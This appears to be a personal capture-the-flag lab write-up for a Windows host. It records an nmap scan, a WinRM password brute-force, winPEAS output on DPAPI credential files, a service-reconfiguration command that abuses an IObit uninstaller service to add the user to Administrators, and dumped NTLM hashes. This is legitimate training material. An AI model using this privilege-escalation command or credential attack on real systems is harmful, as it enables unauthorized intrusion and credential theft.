# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
`FoundCREDs`

### Flag
- `DANTE{superB4d_p4ssw0rd_FTW}`
- `DANTE{Qu0t3_I_4M_secure!_unQu0t3}`
## External
### Enumeration
```shell
Nmap scan report for 172.16.1.101
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
![](https://i.imgur.com/hYqRzrc.png)
![](https://i.imgur.com/A3BGJi7.png)
` login: dharding   password: WestminsterOrange5 `
![](https://i.imgur.com/aKPlkKJ.png)
- it is account password and winrm is enabled from the port so, i created the wordlist and brutefforce it
![](https://i.imgur.com/YVbAEmN.png)
![](https://i.imgur.com/b2sbfua.png)
- ` dharding : WestminsterOrange17 `
### Gaining Access
![](https://i.imgur.com/V4UbKZx.png)
## Internal
### Enumeration
```
    C:\Program Files\CUAssistant
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\rempl
    C:\Program Files\Uninstall Information
    C:\Program Files\UNP
C:\Program Files (x86)
-------------------
Common Files
FileZilla Server
Internet Explorer
IObit
Microsoft.NET
Windows Defender
Windows Mail
Windows Media Player
Windows Multimedia Platform
Windows NT
Windows Photo Viewer
Windows Portable Devices
WindowsPowerShell

    
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (dharding) Uninstaller_SkipUac_dharding: C:\Program Files (x86)\IObit\IObit Uninstaller\IObitUninstaler.exe /UninstallExplorer
 Scheduled Tasks
-----------------------------------------------------------
Current System Time: 06/24/2024 06:52:06

TaskName    : \Uninstaller_SkipUac_dharding
Run As User : dharding
Task To Run : C:\Program Files (x86)\IObit\IObit Uninstaller\IObitUninstaler.exe /UninstallExplorer



  UDP        127.0.0.1             1900          *:*                            4152              svchost
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-3529848291-2371357972-1873374923-1001\5bc96c14-a85d-45d7-8568-80ff29215ca4
    Accessed: 08/01/2021 05:43:55
    Modified: 08/01/2021 05:42:18
   =================================================================================================

    MasterKey: C:\Users\dharding\AppData\Roaming\Microsoft\Protect\S-1-5-21-3529848291-2371357972-1873374923-1001\ca7e39cf-799d-4dbd-b42b-74e634df8113
    Accessed: 08/01/2021 05:43:59
    Modified: 08/01/2021 05:42:18
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
    CredFile: C:\Users\dharding\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 5bc96c14-a85d-45d7-8568-80ff29215ca4
    Accessed: 24/06/2024 05:40:37
    Modified: 13/07/2020 06:06:58
    Size: 11152
```
![](https://i.imgur.com/sYSgte0.png)
https://www.exploit-db.com/exploits/48543
```
sc config IObitUnSvr binPath= "cmd /c net localgroup Administrators dharding /add"
```
![](https://i.imgur.com/GF42u24.png)
![](https://i.imgur.com/fNQFaDI.png)
- also did like the exploit and it worked
	- ![](https://i.imgur.com/aXJUYTA.png)
### Gaining Access
```shell
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4c827b7074e99eefd49d05872185f7f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
dharding:1001:aad3b435b51404eeaad3b435b51404ee:9a64e3e730594630f571ee71c6a9661b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1002:aad3b435b51404eeaad3b435b51404ee:06002020e60e9ec6865e40776629c273:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2e68a3ca340652eb2107a49d2d1b8049:::
```

### Maintaining Access


# Random Notes